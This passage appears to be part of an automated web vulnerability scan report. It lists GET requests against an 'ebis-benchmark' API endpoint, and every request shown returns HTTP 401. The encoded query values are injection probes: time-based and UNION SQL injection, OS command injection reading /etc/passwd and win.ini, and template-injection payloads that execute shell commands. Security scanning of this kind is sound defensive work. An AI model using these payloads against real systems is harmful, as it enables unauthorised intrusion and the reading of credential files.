  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=case+randomblob%25281000000%2529+when+not+null+then+1+else+1+end+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=case+randomblob%252810000000%2529+when+not+null+then+1+else+1+end+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=case+randomblob%2528100000000%2529+when+not+null+then+1+else+1+end+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=case+randomblob%25281000000000%2529+when+not+null+then+1+else+1+end+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=cat+%252Fetc%252Fpasswd&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=cnqtxwuxsz6332bz3mpb588ov8icuuc0d6l9tshbj5pmebh25ikk6h7o8h&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522%2526cat+%252Fetc%252Fpasswd%2526%2522&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522%2526sleep+15.0%2526%2522&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522%2526timeout+%252FT+15.0%2526%2522&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2522&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522%253Bcat+%252Fetc%252Fpasswd%253B%2522&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522%253Bget-help&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522%253Bsleep+15.0%253B%2522&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522%253Bstart-sleep+-s+15.0&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522%257Ctimeout+%252FT+15.0&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2522&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2522&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522+%252F+sleep%252815%2529+%252F+%2522&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522+and+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522+UNION+ALL+select+NULL+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2522+where+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2526cat+%252Fetc%252Fpasswd%2526&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2526sleep+15.0%2526&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2526timeout+%252FT+15.0&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2526type+%2525SYSTEMROOT%2525%255Cwin.ini&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527%2526cat+%252Fetc%252Fpasswd%2526%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527%2526sleep+15.0%2526%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527%2526timeout+%252FT+15.0%2526%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527%2528&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527%2529+UNION+ALL+select+NULL+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527%253Bcat+%252Fetc%252Fpasswd%253B%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527%253Bget-help&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527%253Bsleep+15.0%253B%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527%253Bstart-sleep+-s+15.0&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527%257Ctimeout+%252FT+15.0&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527+%252F+sleep%252815%2529+%252F+%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527+AND+%25271%2527%253D%25271%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527+AND+%25271%2527%253D%25272%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527+and+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527+OR+%25271%2527%253D%25271%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527+UNION+ALL+select+NULL+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2527+where+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2529%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2529%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2529%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2529+UNION+ALL+select+NULL+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+%2528&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%253B&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%253Bcat+%252Fetc%252Fpasswd%253B&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%253Bget-help&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%253Bget-help+%2523&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%253Bsleep+15.0%253B&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%253Bstart-sleep+-s+15.0&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%253Bstart-sleep+-s+15.0+%2523&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%257Ctimeout+%252FT+15.0&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2522%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2522%252Bresponse.write%252868%252C931*937%252C386%2529%252B%2522&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2522%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E%253C&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E%253C&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2522&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2522case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2522java.lang.Thread.sleep%2522%252815000%2529&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2523%257B%2525x%2528sleep+15%2529%257D&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2523%257Bglobal.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%257D&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2523set%2528%2524engine%253D%2522%2522%2529%250A%2523set%2528%2524proc%253D%2524engine.getClass%2528%2529.forName%2528%2522java.lang.Runtime%2522%2529.getRuntime%2528%2529.exec%2528%2522sleep+15%2522%2529%2529%250A%2523set%2528%2524null%253D%2524proc.waitFor%2528%2529%2529%250A%2524%257Bnull%257D&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
